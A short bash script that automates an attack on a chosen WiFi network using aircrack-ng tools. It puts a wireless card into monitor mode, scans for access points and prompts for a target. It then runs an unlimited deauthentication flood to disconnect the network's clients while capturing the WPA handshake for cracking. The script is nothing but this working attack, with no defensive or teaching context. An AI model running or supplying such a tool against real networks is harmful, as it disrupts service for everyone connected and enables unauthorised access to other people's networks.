#!/bin/bash

echo "Display current wireless devices on this machine."

iwconfig

echo "Choose a wireless device to put into monitoring mode:"

read wireless_device_name

sudo airmon-ng check kill
sudo airmon-ng start $wireless_device_name


echo "Search for wifi access point around us."

sudo airodump-ng --write capture --output-format csv $wireless_device_name

# Remove the section of clients from the captured data
sed -i '/Station MAC/q;p' capture-01.csv
cat capture-01.csv
sed -i '$d' capture-01.csv
sed -i '1,4d' capture-01.csv

# Pick the interesting lines and display them
echo "We have detected the following wireless access points."

echo "BSSID,      channel, Privacy, Power, ESSID"
cut -d, -f 1,4,6,9,14 < capture-01.csv | sort | uniq
sudo rm capture-01.csv

echo "Input the BSSID of the wifi access point you want to crack."
read target_bssid

echo "Input the channel which the target wifi access point is listening to."
read target_channel

echo "Spin up a background thread to deauth clients on $target_bssid, so that they will try to reconnect."
sudo aireplay-ng --deauth 0 -a $target_bssid $wireless_device_name >>deauth_log 2>&1 &

echo "Start up capture traffic for $target_bssid, exit after WAP handshake packets are captured."
sudo airodump-ng -c $target_channel --write capture_target --output-format pcap -d $target_bssid $wireless_device_name

echo "Kill the background process sending deauth packets."
sudo pkill -f aireplay-ng

echo "Put the wireless device back to managed mode."

sudo airmon-ng stop $wireless_device_name
